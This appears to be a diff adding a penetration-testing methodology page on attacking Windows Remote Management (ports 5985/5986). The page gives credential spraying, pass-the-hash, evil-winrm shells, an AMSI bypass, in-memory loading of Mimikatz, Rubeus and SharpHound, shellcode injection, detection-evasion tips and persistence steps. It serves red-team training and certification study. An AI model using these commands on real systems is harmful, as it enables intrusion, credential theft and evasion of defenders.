@@ -1,0 +1,436 @@
+---
+title: WinRM - Ports 5985, 5986
+description: Post-credential validation, PowerShell Remoting shell access, and lateral movement methodology for WinRM/WSMan on ports 5985 and 5986.
+openGraph:
+  title: "WinRM - Ports 5985, 5986"
+  description: "Post-credential validation, PowerShell Remoting shell access, and lateral movement methodology for WinRM/WSMan on ports 5985 and 5986."
+  images:
+    - url: /imgs/WINRM.jpg
+      width: 1672
+      height: 941
+      alt: WinRM - Ports 5985, 5986
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "WinRM - Ports 5985, 5986"
+  description: "Post-credential validation, PowerShell Remoting shell access, and lateral movement methodology for WinRM/WSMan on ports 5985 and 5986."
+  images:
+    - url: /imgs/WINRM.jpg
+      width: 1672
+      height: 941
+      alt: WinRM - Ports 5985, 5986
+      type: image/jpeg
+---
+
+# WinRM - Ports 5985, 5986
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p5985,5986 <IP>
+
+# Pre-auth WSMan fingerprint confirms listener + advertised auth methods
+curl -sk -I http://<IP>:5985/wsman
+curl -sk -I https://<IP>:5986/wsman          
+
+nxc winrm <IP> -u <USER> -p <PASS>
+#options
+-d <DOMAIN> # domain-scoped
+-H <HASH> # pass-the-hash
+-x <command> # cmd execution
+-X <PowerShell command> # PowerShell execution
+--kerberos # KRB5CCNAME ticket
+
+# Evil-WinRM primary interactive shell
+evil-winrm -i <IP> -u <USER> -p <PASS>
+#options
+-H <HASH> # pass-the-hash
+-S # HTTPS (5986)
+-P <PORT> # non-standard port
+-r <DOMAIN> # Kerberos (TGT in KRB5CCNAME)
+-s /opt/ps/ -e /opt/exe/ # tool dirs
+-c cert.pem -k priv.key -S # certificate auth
+
+# Impacket atexec/psexec fallbacks (use if WinRM is gated by JEA/CLM)
+impacket-atexec -hashes :<HASH> <USER>@<IP> "whoami"
+impacket-psexec <DOMAIN>/<USER>:<PASS>@<IP>
+
+# enum
+Get-LocalUser # enumerate local users
+Get-ADUser # enumerate domain users
+whoami ; whoami /groups ; whoami /priv ; whoami /groups /priv ; hostname ; ipconfig /all # identity and privileges
+
+
+
+```
+
+```powershell
+# From a Windows host or pwsh build a credential without prompting
+$user = '<DOMAIN>\<USER>'
+$pass = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
+
+# Reachability test without authenticating
+Test-WSMan -ComputerName <IP>
+
+# Interactive session and one-shot command
+Enter-PSSession -ComputerName <IP> -Credential $cred
+Invoke-Command -ComputerName <IP> -Credential $cred -ScriptBlock { whoami /all }
+
+# Fan-out across many hosts / run a local script remotely
+Invoke-Command -ComputerName (Get-Content hosts.txt) -Credential $cred -ScriptBlock { hostname; whoami }
+Invoke-Command -ComputerName <IP> -Credential $cred -FilePath .\Invoke-Mimikatz.ps1
+
+# Enumerate session configurations (JEA / constrained-endpoint discovery)
+Get-PSSessionConfiguration
+Invoke-Command -ComputerName <IP> -Credential $cred -ConfigurationName <NAME> -ScriptBlock { whoami }
+```
+
+## Methodology
+
+### Phase 1: Confirm WinRM Access
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is a real WSMan listener responding on 5985/5986, or is the port something else?
+  - Which authentication methods does the listener advertise (Negotiate, Kerberos, Basic, Certificate)?
+  - Do I know the host's FQDN, which Kerberos auth will require?
+  - Is HTTPS (5986) in use with a self-signed cert that `pwsh` will reject but evil-winrm accepts?
+</Callout>
+
+```bash
+# Confirm the WSMan listeners
+nmap -sV -sC -p5985,5986 <IP>
+
+# Pre-auth fingerprint a live listener returns WWW-Authenticate: Negotiate
+curl -sk -I http://<IP>:5985/wsman
+curl -sk -I https://<IP>:5986/wsman
+```
+
+- [ ] `nmap -sV -sC -p5985,5986 <IP>` confirm WSMan. 5985 is HTTP, 5986 is HTTPS; default installs only expose 5985, and 5986 requires an explicit certificate binding.
+- [ ] `curl -sk -I http://<IP>:5985/wsman` a live listener responds with `WWW-Authenticate: Negotiate`. A 404 or reset means the port is not WinRM. The advertised methods tell you whether Basic or Certificate auth is in play.
+- [ ] Record the **FQDN** (from `rdp-ntlm-info`, reverse DNS, or LDAP). Kerberos to WinRM needs the FQDN; the raw IP forces NTLM.
+- [ ] Note whether 5986 is in use a self-signed cert is common on lab/exam hosts. Evil-WinRM accepts these by default; `pwsh` on Linux rejects them unless you skip validation.
+
+**Move to Phase 2** once a WSMan listener is confirmed and you have noted the FQDN and advertised auth methods.
+
+### Phase 2: Credential Validation and Spraying
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Does the credential authenticate, and does it actually have remote-execution rights (`Pwn3d!`)?
+  - Should this be validated against the domain (`-d`) or the local SAM?
+  - Will pass-the-hash or a Kerberos ticket work where a password is not available?
+  - Which credentials from SMB, FTP, SNMP, GPP cPassword, SYSVOL, or Responder have I not yet tried here?
+  - Is single-password spraying safer than user-by-user given the domain lockout policy?
+  - Is a local Administrator hash cloned across imaged hosts in this environment?
+</Callout>
+
+```bash
+nxc winrm <IP> -u <USER> -p <PASS>
+
+# Domain-scoped, pass-the-hash, and Kerberos variants
+nxc winrm <IP> -u <USER> -p <PASS> -d <DOMAIN>
+nxc winrm <IP> -u <USER> -H <HASH>
+nxc winrm <IP> -u <USER> --kerberos
+
+# Multi-credential stuffing, subnet-wide sweep, local-admin hash spray
+nxc winrm <IP> -u users.txt -p passwords.txt
+nxc winrm <SUBNET>/24 -u <USER> -p <PASS>
+nxc winrm <SUBNET>/24 -u Administrator -H <HASH>
+```
+
+- [ ] `nxc winrm <IP> -u <USER> -p <PASS>` `[+]` means valid at the protocol level; `[+] Pwn3d!` means valid **and** the user is in Remote Management Users or local admin (remote execution rights).
+- [ ] `nxc winrm <IP> -u <USER> -p <PASS> -d <DOMAIN>` omitting `-d` against a domain-joined host tries the local SAM first, which often fails for a valid domain account.
+- [ ] `nxc winrm <IP> -u <USER> -H <HASH>` WinRM natively supports NTLM, so pass-the-hash works directly, no Restricted Admin Mode.
+- [ ] `nxc winrm <IP> -u <USER> --kerberos` with `KRB5CCNAME` set reference the target by FQDN in `/etc/hosts`/DNS and set the realm in `/etc/krb5.conf`.
+- [ ] Harvest every credential from prior phases (SMB, FTP, SNMP, database dumps, web config files, GPP cPassword, SYSVOL, Responder captures) admin and helpdesk accounts routinely have remote-execution rights, making WinRM a high-value spray target.
+- [ ] `nxc winrm <IP> -u users.txt -p '<PASS>'` single-password spray is the safer pattern: one password per user per run, respecting lockout thresholds. Use exhaustive `users.txt` + `passwords.txt` stuffing only when both lists are small and lockout risk is understood.
+- [ ] `nxc winrm <SUBNET>/24 -u <USER> -p <PASS>` a single working admin credential often returns `Pwn3d!` on ten or more hosts at once.
+- [ ] `nxc winrm <SUBNET>/24 -u Administrator -H <HASH>` imaged hosts frequently share a local Administrator hash; this verifies reuse non-interactively.
+- [ ] If everything returns `STATUS_LOGON_FAILURE`, recheck the `curl -sk -I` `WWW-Authenticate` header the listener may be Basic- or certificate-auth only.
+
+### Phase 3: Interactive Shell Evil-WinRM
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Password, hash, or Kerberos ticket which auth is available and quietest here?
+  - Is AMSI in the way before I load any offensive tooling?
+  - Should I preload my script/binary directories to streamline tool execution?
+  - Is this 5986 with a self-signed cert that needs `-S`?
+</Callout>
+
+```bash
+# Default shell, pass-the-hash, HTTPS, Kerberos
+evil-winrm -i <IP> -u <USER> -p <PASS>
+evil-winrm -i <IP> -u <USER> -H <HASH>
+evil-winrm -i <IP> -u <USER> -p <PASS> -S
+evil-winrm -i <FQDN> -u <USER> -r <DOMAIN>
+
+# Preload tool directories for in-session upload / Invoke-Binary
+evil-winrm -i <IP> -u <USER> -p <PASS> -s /opt/ps/ -e /opt/exe/
+```
+
+- [ ] `evil-winrm -i <IP> -u <USER> -p <PASS>` lands you in a fully interactive PowerShell runspace as the target user.
+- [ ] `evil-winrm -i <IP> -u <USER> -H <HASH>` pass-the-hash directly against a default WinRM config (no Restricted Admin Mode).
+- [ ] `evil-winrm -i <FQDN> -u <USER> -r <DOMAIN>` with `KRB5CCNAME` set the stealthiest path; no NTLM on the wire, looks like a normal admin using PSRemoting.
+- [ ] Preload with `-s /opt/ps/ -e /opt/exe/`; inside the session, `menu` lists loadable scripts and binaries.
+- [ ] **First command in every session:** `Bypass-4MSI` patches in-memory `amsi.dll` so subsequent scripts/.NET assemblies are not scanned. Without it, loading mimikatz/Rubeus triggers AMSI immediately.
+- [ ] For HTTPS add `-S`; evil-winrm ignores cert validation by default (correct against self-signed lab hosts, note it in the report).
+
+**Move to Phase 4** as soon as you have an interactive runspace and have run `Bypass-4MSI`.
+
+### Phase 4: Situational Awareness From the Runspace
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Who am I, and what do my privileges and group memberships allow?
+  - Do I have a `Se*Privilege` that is a direct path to SYSTEM?
+  - Am I actually local admin, or only Remote Management Users?
+  - What credentials, stored secrets, and reachable hosts can I see from here?
+</Callout>
+
+```powershell
+# Identity and privileges whoami /priv is the highest-value command
+whoami /all
+whoami /priv
+net localgroup administrators
+
+# Stored credentials and host fingerprint
+cmdkey /list
+systeminfo
+ipconfig /all
+```
+
+- [ ] `whoami /priv` if you see `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, or `SeTakeOwnershipPrivilege`, you have a direct path to SYSTEM.
+- [ ] `net localgroup administrators` confirm whether you are admin or merely Remote Management Users; it changes everything downstream.
+- [ ] `cmdkey /list` plus `Get-ChildItem $env:LOCALAPPDATA\Microsoft\Credentials\`  enumerate stored credentials for DPAPI looting.
+- [ ] Upload tooling with the built-in `upload` then run .NET in memory after the AMSI bypass:
+  ```
+  Bypass-4MSI
+  Invoke-Binary /opt/tools/SharpHound.exe '-c All --OutputDirectory C:\Windows\Temp\'
+  ```
+  `Invoke-Binary` reflectively loads the assembly into the current runspace no disk write, no AV scan of the binary, no Sysmon 11 for the tool.
+### Phase 5: Constrained Language Mode and JEA
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What language mode is this runspace in, and what does that forbid?
+  - Is CLM backed by AppLocker/WDAC, and is a known bypass viable on this build?
+  - In a JEA endpoint, which allowed cmdlets could be turned into an escape (`iex`, `Add-Type`, `Start-Process`)?
+  - Are there non-default PSSession configurations left accessible?
+</Callout>
+
+```powershell
+# Check language mode immediately on connection
+$ExecutionContext.SessionState.LanguageMode
+
+# Discover what a JEA endpoint actually allows, and target non-default configs
+Get-Command
+Invoke-Command -ComputerName <IP> -Credential $cred -ConfigurationName <NAME> -ScriptBlock { whoami }
+```
+
+- [ ] `$ExecutionContext.SessionState.LanguageMode` `FullLanguage` is unrestricted; `ConstrainedLanguage` blocks COM/reflection/.NET instantiation (most loaders fail); `RestrictedLanguage`/`NoLanguage` means a JEA allowlist of a handful of functions.
+- [ ] If CLM is enforced, check for the backing AppLocker/WDAC policy bypasses exist (legacy `System.Management.Automation.dll` loading, signed dotnet tools) but most are patched on current builds.
+- [ ] In a JEA endpoint, `Get-Command` lists the allowlist hunt for an escape cmdlet (`Invoke-Expression`, `Add-Type`, `Start-Process`, or any proxy function that calls `iex` internally). A single `iex` collapses the entire restriction.
+- [ ] Enumerate and target non-default configurations: `Invoke-Command -ConfigurationName <NAME>`. Defaults are `Microsoft.PowerShell`, `Microsoft.PowerShell32`, `Microsoft.PowerShell.Workflow`; custom names indicate JEA or a misconfigured endpoint.
+
+<Callout type="info">
+**Evil-WinRM uses the default `Microsoft.PowerShell` endpoint.** If the admin locked down the default but left other configurations open, evil-winrm "fails" while native `Invoke-Command -ConfigurationName <custom>` works. When WinRM is open but evil-winrm gives no runspace, drop to `pwsh` and iterate through `Get-PSSessionConfiguration`.
+</Callout>
+
+### Phase 6: Lateral Movement From a WinRM Foothold
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which working credential/hash should I spray subnet-wide next?
+  - Will my next hop hit the WinRM double-hop problem, and how do I avoid it?
+  - Does BloodHound's `CanPSRemote` edge map exactly where this identity can execute?
+  - Do I have a TGT that gets me onto every listener without exposing an NTLM hash?
+</Callout>
+
+```bash
+# Spray working creds / dumped hashes across the subnet
+nxc winrm <SUBNET>/24 -u <USER> -p <PASS>
+nxc winrm <SUBNET>/24 -u Administrator -H <HASH>
+```
+
+- [ ] `nxc winrm <SUBNET>/24 -u <USER> -p <PASS>` WinRM compounds faster than any other reuse protocol; one credential frequently yields execution on many hosts.
+- [ ] `nxc winrm <SUBNET>/24 -u Administrator -H <HASH>` after dumping LSASS a shared local Administrator hash becomes every workstation in the network.
+- [ ] For second hops, expect the **double-hop problem** (see callout) ass an explicit `$cred` object in nested `Invoke-Command`, enable CredSSP, or run `Invoke-Command -ComputerName B` from your attacker box instead of from inside A.
+- [ ] Use BloodHound's `CanPSRemote` edge to know exactly which accounts can WinRM where, rather than guessing.
+
+<Callout type="warning">
+**The WinRM double-hop problem.** When you connect to host A via WinRM, your credentials are stored on A as a Network logon (Type 3), which carries no delegatable credentials  so a second hop from A to B fails with `Access Denied`. Workarounds: (1) Kerberos with CredSSP delegation, (2) a fresh PSSession with explicit `$cred` (re-sends credentials rather than reusing the forwarded identity), (3) pivot via a different protocol (SMB/psexec), or (4) drive both hops from your attacker machine.
+</Callout>
+
+**Loop back to Phase 3** on each newly reached host. When you hold Domain Admin or have exhausted reachable hosts, transition to objective completion and reporting.
+
+<Quiz
+  question="You have valid credentials that return Pwn3d! on both WinRM (evil-winrm) and RDP (xfreerdp3) against the same Windows Server 2022 target. You need to dump LSASS and keep pivoting. Which do you use first and why?"
+  options={[
+    "RDP the GUI lets you interact with tools visually and see errors faster",
+    "WinRM it produces a Network (Type 3) logon and leaves a smaller logon-artifact footprint",
+    "Both in parallel, for redundancy in case one drops",
+    "Neither always use impacket-psexec to avoid leaving any logon events"
+  ]}
+  answer={1}
+  explanation="WinRM is the correct default for operational work. It produces 4624 Logon Type 3 (Network) the same as normal SMB access and blends into baseline admin noise, leaving no user-profile residue. RDP produces Type 10 (RemoteInteractive), which every mature SOC monitors aggressively and which writes user-profile artifacts (RDP cache, jump lists, browser history). RDP is correct only when you specifically need the GUI. Option 3 doubles your footprint for no gain. Option 4 is a misconception psexec also produces 4624 (Type 3) plus loud Service Control Manager events (7045, 7036), noisier than WinRM, not quieter."
+/>
+
+## Overview
+
+WinRM (Windows Remote Management) is Microsoft's implementation of the WS-Management protocol, layered on SOAP over HTTP/HTTPS. It is the transport underneath PowerShell Remoting (PSRP), Server Manager, Windows Admin Center, and WMI-over-WinRM on modern Windows. To an attacker, the "WinRM port" is really the front door to PowerShell Remoting.
+
+| Detail | Value |
+|--------|-------|
+| Port 5985/TCP | WinRM over HTTP (message-level encryption via SPNEGO when using Negotiate/Kerberos) |
+| Port 5986/TCP | WinRM over HTTPS (TLS in addition to message-level encryption) |
+| Protocol | WS-Management (SOAP 1.2 / WS-Man 1.1) |
+| Default auth | Negotiate (Kerberos → NTLM fallback), Certificate, Basic (disabled by default) |
+| Access requirement | Member of `Remote Management Users` **or** `Administrators` |
+| Default on | Windows Server 2012+ (server roles); off by default on desktop Windows until enabled |
+| Logon type generated | 4624 Type 3 (Network); Type 8 (NetworkCleartext) for Basic auth |
+| Configuration store | `winrm get winrm/config`, `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN` |
+
+<Callout type="info">
+WinRM HTTP traffic is **not plaintext** on domain-joined hosts. With the default Negotiate auth, the SOAP payload is wrapped in SPNEGO message-level encryption (NTLM sealing or Kerberos KRB_PRIV), so 5985 is already confidential without TLS. This is why most environments do not bother configuring 5986, and why sniffing 5985 mid-session yields nothing useful without breaking the seal.
+</Callout>
+
+### Authentication Methods
+
+| Method | Default | Attacker Notes |
+|--------|---------|----------------|
+| Negotiate | Yes | Tries Kerberos first, falls back to NTLM. The default path for most attacks. |
+| Kerberos | Yes (inside Negotiate) | Requires FQDN target, working DNS/krb5.conf, TGT in `KRB5CCNAME`. Stealthiest. |
+| NTLM | Yes (inside Negotiate) | Works from IP or hostname. PtH works directly. |
+| Basic | Disabled by default | Plaintext over HTTP. Only if explicitly enabled usually a misconfiguration. |
+| CredSSP | Disabled by default | Required for the classic double-hop workaround; forwards credentials to the target. |
+| Certificate | Disabled by default | Mutual TLS with a client cert. Rare; `evil-winrm -c cert.pem -k priv.key -S`. |
+
+### The Remote Management Users Group
+
+Valid credentials are necessary but not sufficient. Windows checks two things in sequence: **authentication** (is this a valid principal?  LSASS via Kerberos/NTLM) and **authorization** (does this principal have rights on the default PowerShell session configuration?  the security descriptor on `Microsoft.PowerShell`). By default that ACL grants `BUILTIN\Administrators` and `BUILTIN\Remote Management Users`. A domain user who is neither authenticates successfully (4624 logged) but fails the authorization check at session creation  which is exactly why `nxc winrm` shows `[+]` without `Pwn3d!`.
+
+## Quick Reference
+
+```cheat
+nmap -sV -sC -p5985,5986 <IP>         # Service scan for WinRM over HTTP/HTTPS
+curl -sk -I http://<IP>:5985/wsman    # Probe WSMan/WinRM endpoint
+nxc winrm <IP> -u <USER> -p <PASS>    # Validate credential for WinRM access
+nxc winrm <IP> -u <USER> -p <PASS> -d <DOMAIN>     # Validate domain credential
+nxc winrm <IP> -u <USER> -H <HASH>    # Pass-the-hash authentication
+nxc winrm <IP> -u users.txt -p '<PASS>'   # Single-password spray against multiple users
+nxc winrm <SUBNET>/24 -u <USER> -p <PASS>   # Sweep subnet for WinRM access
+nxc winrm <IP> -u <USER> -p <PASS> -x "whoami"        # Execute a command
+nxc winrm <IP> -u <USER> -p <PASS> -X "Get-Process"   # Execute a PowerShell command
+evil-winrm -i <IP> -u <USER> -p <PASS>            # Interactive shell via evil-winrm
+evil-winrm -i <IP> -u <USER> -H <HASH>            # Evil-winrm interactive shell via pass-the-hash
+evil-winrm -i <IP> -u <USER> -p <PASS> -S         # Evil-winrm shell over HTTPS
+evil-winrm -i <FQDN> -u <USER> -r <DOMAIN>        # Evil-winrm shell over Kerberos (requires FQDN)
+evil-winrm -i <IP> -u <USER> -p <PASS> -s /opt/ps/ -e /opt/exe/   # Preload script/binary directories
+Test-WSMan -ComputerName <IP>    # Native PowerShell reachability test
+Enter-PSSession -ComputerName <IP> -Credential $cred    # Native PowerShell interactive session (PSSession)
+```
+
+## Evil-WinRM Deep Dive
+
+Evil-WinRM is a Ruby client built around offensive PowerShell Remoting workflows. It implements WSMan via the `winrm` gem and layers attacker features on top: file transfer, AMSI bypass, in-memory .NET execution, script preloading, and DLL side-loading over SMB.
+
+```bash
+# Kali / Debian
+sudo apt install evil-winrm
+
+# Universal (Ruby gem) use when the apt version lags upstream
+gem install evil-winrm
+```
+
+### Built-in Commands
+
+| Command | Description |
+|---------|-------------|
+| `upload <LOCAL> [REMOTE]` | Upload to the target. Base64 over the runspace  slow for large files. |
+| `download <REMOTE> [LOCAL]` | Pull from the target. Same base64 transport. |
+| `menu` | Show loaded scripts (`-s`), binaries (`-e`), and evil-winrm functions. |
+| `Bypass-4MSI` | AMSI bypass patches `amsi.dll` in memory. Run before any PS payload loading. |
+| `Invoke-Binary <EXE> [args]` | Reflectively load and execute a .NET assembly in memory, no disk write. |
+| `Donut-Loader -process_id <PID> -donut_file <file.bin>` | Inject shellcode into a process. |
+| `Dll-Loader -smb -path \\<IP>\share\lib.dll` | Side-load a DLL from an SMB share via reflection. |
+
+<Callout type="warning">
+**`upload`/`download` are base64 over the runspace.** Every byte round-trips as PowerShell strings through the SOAP envelope. Uploading a 50 MB binary takes minutes and generates obvious ScriptBlock logs (Event 4104). For anything larger than a few MB, transfer via SMB or HTTP and use evil-winrm only to execute the staged payload. `impacket-smbserver` + `iwr` from inside the session is the fastest, quietest pattern.
+</Callout>
+
+### Invoke-Binary the Most Important Feature
+
+`Invoke-Binary` reflectively loads a .NET assembly into the current PowerShell AppDomain and executes `Main()`. Nothing touches disk  no file write, no Sysmon 11, no AV scan of the binary. Arguments are passed as a single comma-separated string.
+
+```
+Bypass-4MSI
+Invoke-Binary /opt/tools/SharpHound.exe '-c All --OutputDirectory C:\Windows\Temp\'
+Invoke-Binary /opt/tools/Rubeus.exe 'kerberoast /outfile:C:\Windows\Temp\roast.txt'
+Invoke-Binary /opt/tools/Seatbelt.exe 'all'
+```
+
+Use this as your default .NET execution path; `upload` + `.\tool.exe` drops the binary on disk and is flagged by modern AV.
+
+## Pass-the-Hash Over WinRM
+
+WinRM PtH works against a default configuration because the default auth is Negotiate → NTLM, and NTLM uses the hash as the underlying secret the cleartext password is never needed.
+
+```bash
+# Validate hash, then interactive shell via hash
+nxc winrm <IP> -u Administrator -H <HASH>
+evil-winrm -i <IP> -u Administrator -H <HASH>
+```
+
+Only the NT hash is needed on modern Windows; pass `LM:NT` if you have both.
+
+## PowerShell Remoting From Linux
+
+You do not need Windows to drive PSRemoting `pwsh` (PowerShell 7) runs on Linux and speaks WSMan natively.
+
+```powershell
+# Build a credential and connect
+$cred = Get-Credential
+Enter-PSSession -ComputerName <IP> -Credential $cred -Authentication Negotiate
+Enter-PSSession -ComputerName <FQDN> -Credential $cred -Authentication Kerberos
+
+# HTTPS with a self-signed cert  skip validation
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+Enter-PSSession -ComputerName <FQDN> -Credential $cred -UseSSL -SessionOption $so
+```
+
+`pwsh` is the fallback when evil-winrm chokes  different endpoint configurations, unusual auth requirements, TLS quirks  and it gives native `Invoke-Command` fan-out across many hosts.
+
+## Enabling WinRM on a Compromised Host
+
+After getting admin on a host without WinRM, enabling it gives a reliable re-entry point.
+
+```powershell
+# Full enable (as admin)
+Enable-PSRemoting -Force -SkipNetworkProfileCheck
+
+# Add a user to Remote Management Users without making them admin
+net localgroup "Remote Management Users" <USER> /add
+
+# Allow connections from any IP, then verify the listener
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
+winrm enumerate winrm/config/listener
+```
+
+<Callout type="warning">
+Enabling WinRM is a **configuration change**, not just a session it persists, shows in `Get-Service WinRM`, and generates Security 4697 (service installed) plus WinRM operational entries. On a red team this is a noisy modification to clean up at the end of the test.
+</Callout>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #PenetrationTesting #RedTeam #Certification #Windows #WinRM #RemoteAccess #PowerShell #Kerberos #NTLM #PassTheHash #PSRemoting #WSMan #PrivilegeEscalation #Persistence #OPSEC
+</div>
